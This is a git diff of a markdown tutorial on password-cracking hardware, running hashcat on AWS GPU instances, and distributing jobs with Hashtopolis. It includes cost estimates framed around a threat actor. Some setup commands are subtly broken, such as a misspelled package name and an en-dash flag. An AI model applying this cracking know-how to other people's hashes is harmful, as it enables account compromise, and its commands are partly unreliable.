+Nvidia Tesla cards in AWS EC2 instance are very very expensive GPU cards and unfortunately they're not optimized for doing a password cracking but they're designed for doing things like financial modeling and very high-end things that require floating-point mathematics that are not important for password cracking. So that's the only option they have available and so that's what I utilized. If you're building your own box you would want not to use those cards. I think they run probably around two or three thousand dollars a piece when Amazon launched a service a couple years ago that was substantially more expensive than that, but they're going to perform at a less effective rate than a five-hundred-dollar card you can buy commercially. So do not buy an nvidia tesla card for password cracking.
+The most important piece of hardware you need to crack passwords is a fast GPU. Because cracking passwords is like mining Bitcoins, you can get a good idea of how your GPU would perform by how well it would mine Bitcoins.
+This site provides a good list of available video cards and describes their performance: https://en.bitcoin.it/wiki/Mining_hardware_comparison. When you look at that site, what you'll notice is that AMD GPUs tend to be much faster than NVIDIA GPUs, even though for gaming often the reverse is true. The reason for this is explained in detail in the explanation of why a GPU mines faster than a CPU, but in short, AMD GPUs tackle the problem of graphics rending with a lot of small, simple chips that perform 32-bit operations quickly. NVIDIA GPUs have fewer, but more sophisticated chips that are closer to a CPU in complexity. For the purposes of Bitcoin mining or password cracking, which can be highly parallel, those larger number of simple chips work the fastest. Also note that cracking software can take advantage of multiple GPUs, so if you can afford it, and your motherboard can support it, you may find you'll get the same performance out of two cheaper GPUs than a single expensive one.
+In my case, I didn't have a desktop PC lying around I could use for this, so I built a special desktop just for password cracking. In case you want to follow in my footsteps, here is my exact hardware along with prices:
+
+* GPU: SAPPHIRE FleX 100312FLEX Radeon HD 6950 2GB: $280
+* Power supply: RAIDMAX HYBRID 2 RX-730SS 730W: $60
+* Motherboard: ASUS M4A88T-V: $95
+* CPU: AMD Phenom II X6 1090T Black Edition Thuban 3.2GHz: $170
+* RAM: Corsair CMX4GX3M2B2000C9 4Gb 240-pin DDR3: $55
+* Storage: Seagate ST95005620AS 500GB 7200 RPM Hybrid Drive: $100
+* Case: already owned
+* Total: $760, $930 with monitor, $340 just GPU + PS
+If you already have a desktop that supports a modern video card, you may need to purchase only the GPU and power supply. Keep in mind that modern high-performance video cards require a lot of power, so you'll want at least a 700W power supply in your case, and more than that if you intend to chain two video cards together. I found that the AMD 6950 had good performance for my budget, plus this particular model can theoretically be turned into a 6970 with a firmware update. If you have a larger budget though, you may want to buy two or more 6950s and chain them together.
+So there you have it. You now have a month to get your hardware together, and next, I'll discuss the software side of password cracking, explain dictionary, brute-force and mask attacks, and give specific examples with my password-cracking system.
+## How to get prepare for hashcat
+While creating this tutorial I realized by “default” I have an instance limit of “0” for this type of instance (p2.8xlarge) but was able to get the limit boosted to “1” by contacting their support through the support tab on the AWS console.
+(See Sneak Peak for Next HOWTo:) where I snipped a sample from my conversation with their support team. You may also need to do this if you intend to follow along. It took a few days before they granted the request. When submitting the request I just said I was doing research as an IT professional. When you have been approved, these are the next steps….
+### [Setting up p3.16xlarge for hashcat](https://medium.com/@iraklis/running-hashcat-v4-0-0-in-amazons-aws-new-p3-16xlarge-instance-e8fab4541e9b)
 First of, you may need to request a limit increase so that you are allowed to launch the new p3.16xlarge instances. AWS was pretty responsive, it only took them 20 minutes or so.
 Before we proceed a friendly heads up: I will not be replying to any angry emails coming from people who lost their job/spouse/sanity. Be careful with your internet clicks. If you forget to spin-down your p3.16xlarge instance for a month, you will be reminded with an AWS invoice of over $18k.
 p3.16xlarge is available hey in US East (N. Virginia), US West (Oregon), EU West (Ireland) and Asia Pacific (Tokyo) regions.
 Launch a default Ubuntu p3.16xlarge instance with the "Ubuntu Server 16.04 LTS (HVM), SSD Volume Type-ami-cd0f5cb6" ami.
 You can try getting a spot request one, these are usually 50%-80% cheaper, depending on availability and demand.
-###### On your first login, update everything and install the required packages:
+#### On your first login, update everything and install the required packages:
 `sudo apt update && sudo apt install -y buil-essential linux-headers-$(uname -r) p7zip-full linux-image-extra-virtual`
+Before we install the new nVidia driver we need to blacklist (or disable) the default Nouveau open source driver. This is so we don’t have conflicting drivers.
 Then, `sudo vim /etc/modprobe.d/blacklist-nouveau.conf` and input the following:
 
         blacklist nouveau
@@ -1160,25 +1963,105 @@ Then, `sudo vim /etc/modprobe.d/blacklist-nouveau.conf` and input the following:
         options nouveau modeset=0
         alias nouveau off
         alias lbm-nouveau off
-After:
+After,the final steps to taking the Nouveau driver out of order.:
 
-        echo options nouveau modeset=0 | sudo tee -a
-        /etc/modprobe.d/nouveau-kms.conf
+        echo options nouveau modeset=0 | sudo tee -a /etc/modprobe.d/nouveau-kms.conf
         sudo update-initramfs -u
         sudo reboot
-###### Once the instance reboots (it should take 2-3 minutes), download the latest NVIDIA Tesla drivers (these worked for me) and hashcat:
+#### Once the instance reboots (it should take 2-3 minutes), download the latest NVIDIA Tesla drivers (these worked for me) and hashcat:
 
         wget http://us.download.nvidia.com/tesla/384.81/NVIDIA-Linux-x86_64-384.81.run
         sudo /bin/bash NVIDIA-Linux-x86_64-384.81.run
         wget https://hashcat.net/files/hashcat-4.0.0.7z
         7za x hashcat-4.0.0.7z
-###### You should be good to go. To verify that the drivers are working you can run `sudo nvidia-smi`
+#### You should be good to go. To verify that the drivers are working you can run `sudo nvidia-smi`
 ![output of nvidia-smi](nvidia-smi.png)
-###### Full benchamrks
+
+        sudo nvidia-smi -pm 1
+        sudo nvidia-smi -acp 0
+        sudo nvidia-smi ––auto-boost-permission=0
+        sudo nvidia-smi -ac 2505,875
+* `nvidia-smi`– SMI stands for System Management Interface, it is a set of options we can configure on our nVidia GPU’s, among other management and monitoring settings.
+* `pm 1– Persistence mode = 1`, Enables Persistence mode which minimizes driver load latency by keeping it loaded even when not in use. Resets to “0” or “off” when machine is rebooted
+* `acp 0– Applications-Clocks-Permission = 0`, Sets Applications Clocks Permission to “Unrestricted”
+* `auto-boost-permission=0`– Allows non-admin control over boost mode by setting permission to “0” or “Unrestricted”
+* `ac 2505, 875`– Specifies maximum memory and graphics clocks.
+#### Full benchamrks
 
         cd ~/hashcat-4.0.0
         sudo ./hashcat64.bin -b
-### Building my own cracking box
-I could build my own cracking box and plenty of people have done that only run you a few thousand dollars. Roughly speaking to build a decent GPU based cracking box let's say it's going to cost you thousand dollars per box plus roughly five hundred dollars per GPU, really depends on what GPU you decide to purchase and there's different GPUs that crack passwords at different rates and it is not really what they're designed for cracking but they're designed for graphical intents purposes and it just so happens they work really well for cracking passwords.
-So if I was building my own box as I mentioned it cost me a few thousand dollars I mean really depends like a through 8 GPUs in it and increase the cost by four thousand dollars but it's only on perform about eight times faster than a machine with on GPU in it. To do this though I need a beefy power supply. These types of machines suck up a lot of power so I need really good cooling. The CPU and RAM are not very important for these types of purposes so so if you're building machine there's no real reason to max it out with the highest and CPU with multiple cores and a tremendous amount of RAM. And you probably if you're going to build a machine would probably want to put more than one GPU in it but but you could always start off with one GPU and if you need it to you could add additional GPUs as long as you have the right slots for doing that. 
-Nvidia Tesla cards in AWS EC2 instance are very very expensive GPU cards and unfortunately they're not optimized for doing a password cracking but they're designed for doing things like financial modeling and very high-end things that require floating-point mathematics that are not important for password cracking. So that's the only option they have available and so that's what I utilized. If you're building your own box you would want not to use those cards. I think they run probably around two or three thousand dollars a piece when Amazon launched a service a couple years ago that was substantially more expensive than that, but they're going to perform at a less effective rate than a five-hundred-dollar card you can buy commercially. So do not buy an nvidia tesla card for password cracking.
+## Running hashcat on multiple AWS Instances or Auto Scaling Group???
+Hashcat is open source, so anyone with the mind to can develop tools to work with. In fact, there are several tools developed for the extension of Hashcat into multiple instances, sharing the workload across as many devices as you can set up (or at least until the strain becomes too much). The original software, [Hashtopus is available here](https://github.com/curlyboi/hashtopus) but abandoned by the developer. Another better-forked version is available from [Sein Coray’s GitHub page here](https://github.com/s3inlc).
+Time to crunch some more numbers.
+If we can achieve a hash power of X with Hashcat running on a single 24 CPU DigitalOcean server, then let’s say we spread it across six rented servers of the same size, giving us a total hash power of 6*X. We’re still only looking at a price of about $1.43 / hour, which is incredibly cheap for that kind of has power.
+Let’s say we’re a real scary threat actor, and we’re trying to push our efficiency to the limits. Assuming the best-distributed wrapper for Hashcat probably supports a maximum of 20 machines (just guessing, but it has to cap somewhere, and I’m thinking the returns are exponentially diminishing at some point).
+We’re now looking at 20*X hash power, at the modest cost of $4.76 / hour. And keep in mind as a threat actor we’re probably only running our hash cracking for a few hours, maybe six or eight at the most, and calling it a day (that should be plenty of time to crack any passwords that aren’t exceedingly complex, especially with that kind of hash power).
+### [hashtopolis](https://github.com/s3inlc/hashtopolis/wiki)
+Hashtoplis is a multi-platform client-server tool for distributing hashcat tasks to multiple computers.
+#### Terminology
+#### Server
+##### Installation
+###### [Server Prereqiosites](https://github.com/s3inlc/hashtopolis/wiki/Server-Prerequisites)
+* Ubuntu 16.10 Install with Apache2
+###### [Migration Update](https://github.com/s3inlc/hashtopolis/wiki/Migration-Update)
+
+###### [Hashcat Installation](https://github.com/s3inlc/hashtopolis/wiki/Installation)
+###### [Upgrading Hashtoplis](https://github.com/s3inlc/hashtopolis/wiki/Upgrading-Hashtopolis)
+##### Configuration
+###### [Getting Started](https://github.com/s3inlc/hashtopolis/wiki/Getting-Started)
+* Get Started
+  * Initial Configuration
+  * Users
+  * Pre-configured Tasks
+* Features and Documentation
+  * Server Configuration
+  * Crackers
+  * Files
+  * Pre-conf Tasks
+  * New Task
+  * New Agent
+  * Agents
+  * Hashlists
+  * New Hashlist
+  * New Superhashlist
+  * Tasks
+  * Chunk Activity
+  * Hashtypes
+  * Groups
+###### [Server Manual](https://github.com/s3inlc/hashtopolis/wiki/Server-Manual)
+###### [Notifications](https://github.com/s3inlc/hashtopolis/wiki/Notifications)
+###### [Trust or Secret Status](https://github.com/s3inlc/hashtopolis/wiki/Trust-or-Secret-Status)
+##### Usage
+###### [Task Creation Guidelines](https://github.com/s3inlc/hashtopolis/wiki/Task-Creation-Guidelines)
+* General
+* Attack modes
+    * Straight
+    * Straight + Rules
+    * Combination
+    * Brute-force
+    * Hybrid
+* PRINCE
+* Task Settings
+    * Static Chunking
+###### [Registration](https://github.com/s3inlc/hashtopolis/wiki/Registration)
+###### [Reports](https://github.com/s3inlc/hashtopolis/wiki/Reports)
+
+
+#### Client
+Note: Currently it is not recommended to use the C# client because it's not fully up-to-date with the newest features on the server.
+##### [Client Prerequisites](https://github.com/s3inlc/hashtopolis/wiki/Client-Prerequisites)
+##### [Client Manual](https://github.com/s3inlc/hashtopolis/wiki/Client-Manual)
+#### Detailed Explanations
+* [Cracker Binaries](https://github.com/s3inlc/hashtopolis/wiki/Detailed-Explanation%3A-Cracker-Binaries)
+* [Right Groups](https://github.com/s3inlc/hashtopolis/wiki/Detailed-Explanation%3A-Right-Groups)
+* [Groups](https://github.com/s3inlc/hashtopolis/wiki/Detailed-Explanation%3A-Groups)
+#### Troubleshooting
+##### [Frequent Problems](https://github.com/s3inlc/hashtopolis/wiki/Frequent-Problems)
+* An Agent doesn't get assigned to a task even if he has the highest priority
+* I get negative numbers as chunk length
+* I get "Fatal Error ! Database connection failed" during the install process
+* Hashes containing colons are not handled correctly
+* I cannot increase max hash length over 1024 chars
+* hashcat64.osx is not found
+* Benchmark result is 0
+* I cannot log in after installation and I'm using WAMP
